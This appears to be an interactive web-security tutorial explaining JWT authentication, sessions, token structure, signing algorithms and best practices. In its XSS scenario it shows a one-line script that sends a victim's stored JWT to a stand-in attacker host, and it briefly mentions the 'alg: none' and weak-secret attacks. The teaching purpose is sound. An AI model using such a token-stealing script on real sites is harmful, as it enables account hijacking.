The Old Way: Sessions

Before JWTs, servers used sessions — storing who's logged in inside their own memory.

1
👤 User sends username + password to server
2
🖥️ Server verifies credentials → creates a Session ID
3
💾 Session ID stored in server memory — e.g. sess_x9k2m → user:101
4
🍪 Server sends Session ID as a cookie to browser
5
📤 Every request, browser sends cookie → server looks up session in memory

Module 04 // Comparison

Session vs JWT

🔴 Session Auth

💾 Server stores session data
🧠 Memory dependent
😰 Breaks on server restart
🌐 Hard to scale horizontally
🍪 Uses cookies (CSRF risk)
✅ Easy to revoke sessions

🟢 JWT Auth

🌊 Stateless — no server storage
📦 Data lives in token
💪 Survives server restarts
📈 Scales horizontally easily
📋 Sent in Authorization header
⏰ Auto-expires — not easy to revoke early
ℹ️
Think of Session Auth like a coat check — the venue holds your coat (the data). JWT is like a wristband — you carry proof of entry yourself.

Module 05 // Token Anatomy

Inside a JWT Token

Click each part to inspect its contents:

Header eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Payload eyJ1c2VySWQiOjEwMSwicm9sZSI6InVzZXIiLCJleHAiOjE3MDAwMDAwMDB9
Signature SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

📋 Header — "What type of token and algorithm?"

{ "alg": "HS256", // Algorithm: HMAC SHA-256 "typ": "JWT" // Token type }

🔵 The header is Base64URL encoded — not encrypted. Anyone can decode it!

📦 Payload — "Who are you and what can you do?"

{ "userId": 101, // Who "role": "user", // Permissions "exp": 1700000000, // Expiry (unix timestamp) "iat": 1699990000 // Issued at }

⚠️ Payload is also Base64URL encoded — NOT secret. Never put passwords here!

These fields are called claims. Standard ones: sub, iss, exp, iat, aud.

🔐 Signature — "Tamper-proof seal"

HMACSHA256( base64url(header) + "." + base64url(payload), secretKey // Only server knows this! )

🔒 The signature is a cryptographic hash. If anyone modifies header or payload, the signature won't match and the server rejects the token.

Module 06 // Core Security

How the Signature Works

The signature is what makes JWT secure. It's a one-way mathematical seal.

HEADER
+
PAYLOAD
+
SECRET KEY
→
HS256()
=
SflKxwRJSMeKKF2QT4fw...
💡
The secret key never leaves the server. Without it, you can't generate a valid signature. This is why forging a JWT is computationally infeasible.
⚠️
If the secret is weak (e.g. "secret" or "password"), attackers can brute-force it and forge their own tokens!

Scenario: Attacker steals JWT from localStorage

If a site has an XSS vulnerability, an attacker's script can steal your token.

👤
Victim logs in → JWT stored in localStorage
😈
Attacker injects malicious script via XSS: fetch('evil.com?t='+localStorage.getItem('jwt'))
📡
Token sent to attacker's server — stolen!
🤖
Attacker sends request with victim's token → Server thinks it's the victim
✅
Server accepts! Attacker has full access as victim
🛡️
Defense: Store JWT in httpOnly cookies (not localStorage), implement Content Security Policy (CSP), validate and sanitize all inputs.

📋 Server-side Verification Steps

1
Extract token from Authorization: Bearer <token>
2
Split into header.payload.signature
3
Recalculate signature using header + payload + secret key
4
Compare with token's signature → if match, accept else reject
5
Check exp claim — if expired, reject

Module 10 // Advanced Concepts

HS256 vs RS256

Two algorithms to sign JWTs — each with different security tradeoffs.

HS256

SYMMETRIC
🔑 ← single secret key

Same key is used to sign and verify.

  • Simple to set up
  • Secret must be shared between parties
  • If key is leaked, tokens can be forged
  • Best for: monolithic apps, single server

RS256

ASYMMETRIC
🔒 Private key (sign) + 🔓 Public key (verify)

Private key signs, public key verifies.

  • More complex, more secure
  • Public key can be shared freely
  • Even if public key is leaked, can't forge tokens
  • Best for: microservices, third-party auth
🚨
alg: none attack — Some old libraries accept tokens with "alg": "none" and no signature. Always explicitly validate the algorithm server-side!

📚 Other JWT Best Practices

✓
Keep tokens short-lived (< 15 min)
✓
Use HTTPS always
✓
Store in httpOnly cookies, not localStorage
✓
Use strong random secret (32+ bytes)
✓
Validate issuer (iss) and audience (aud)
✓
Implement token refresh pattern
